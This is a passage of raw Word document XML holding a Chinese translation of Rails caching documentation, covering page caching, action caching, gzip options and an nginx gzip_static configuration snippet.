          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>public</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件夹)，可以通过修改配置选项 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_controller.page_cache_directory</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来设置。由于可能在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>public</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录下放其他静态 html 文件，所以修改掉默认的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>public</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 可以避免命名冲突。但这就需要重新配置 web server 让它知道从哪里来获取已经缓存的文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A9C60A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页面缓存机制会自动添加 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.html</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 后缀名到请求的没有后缀的页面，以使 webserver 更加容易的查找到这些页面。可以通过修改配置选项 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_controller.page_cache_extension</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来改变。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C35BB7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当添加一个新的产品（ product ）时，为了使页面失效，可以这样修改控制器：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="2C7F5F1F" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3464BBC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ProductsController &lt; ActionController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1784F0D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6218A51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caches_page :index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6681A77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17033B3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index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7204119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@products</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Products.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2123887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6B367F6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24C2E4F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create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63D6C17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expire_page :action</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40C8644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62BC735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72A12E6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2D70F96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如果想使用一个更复杂的失效机制，可以使用缓存清理器（ cache sweepers ）在改变发生时使已缓存的对象失效。这在 Sweepers 部分有说明。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="621D001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页面缓存默认会自动压缩（ gzip ）文件，（例如用户请求 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/products</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>products.html.gz</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ）为了减少数据传输的大小（ web 服务器一般配置为使用合适的压缩比例，但因为已经有一次预编译了，压缩比例是最大的了）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D9A69F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Nginx 可以通过开启 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>gzip_statis</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来直接使用硬盘上的已压缩的内容。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6000"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="77AF2ACF" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="77E03E9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location /  {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70CDE51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gzip_static on; # to serve pre-gzipped version</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25DBAE0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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="160A4E3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也可以通过将 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:gzip</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项设置为 false 来关闭使用压缩文件，（例如 action 返回图片时则不需要压缩）。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="36840B8A" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2467A079" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="231307843"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>caches_page :image, :gzip</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="02BB6ED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或者设置特定的压缩级别（级别名称可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Zlib</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的常量）：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="49ED2A96" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B9839C5" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1320427664"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>caches_page :image, :gzip</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :best_speed</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2A879C2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页面缓存会忽略所有的参数。如 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/products?page=1</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会在文件系统中生成没有关于 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>page</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/products.html</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。这样如果之后有人请求 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/products?page=2</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，将会获取到缓存的第一页。能采取的措施就是把参数包含在页面的路径中，如： </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/productions/page/1</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7F427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页面缓存在过滤器之后运行。这样，只要你中断无效的请求就不会生成伪造的缓存纪录。通常在一些检验请求的 before filter 中的跳转会做这项工作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40259A16"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1.2 Action 缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D95031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页面缓存的问题之一是，不能缓存需要限制访问的页面。这时就有了 Action 缓存。Action 缓存和页面缓存一样，但它的网页请求是从 webserver 到 Rails 栈和 Action Pack 中。这样 before filter 可以在 cache 服务之前运行。就使得在获取缓存副本的同时也能运行权限和其他验证限制。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A3DBD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清除缓存的方法和清除页面缓存一样，除了使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>expire_action</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 代替 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>expire_page</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2136F07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如果想要已验证的用户才能调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ProductionsController</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的 action。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="6A13A91D" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="53B4327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ProductsController &lt; ActionController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4300D74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124F5C5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before_filter :authenticate</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="099558A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caches_action :index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4176041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6787938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index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5733DCE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@products</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Product.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7BAED74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7D8653B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2546ED9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create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D15D72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expire_action :action</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39EAF0F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052A333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3EFC249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0F4BA09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可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> （或 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ）来传递一个 Proc 来确定什么时候 action 能被缓存。同时也可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:layout =&gt; false</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来取消 layout 的缓存，这样在 layout 中的动态信息如登录的用户信息或者购物车的项目数量就不被缓存了。这个特性在 Rails 2.2 就可以使用了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635C9FA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可以通过修改 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:cache_path</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项的值来传递默认的 action 缓存的路径。修改的值被直接传给 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
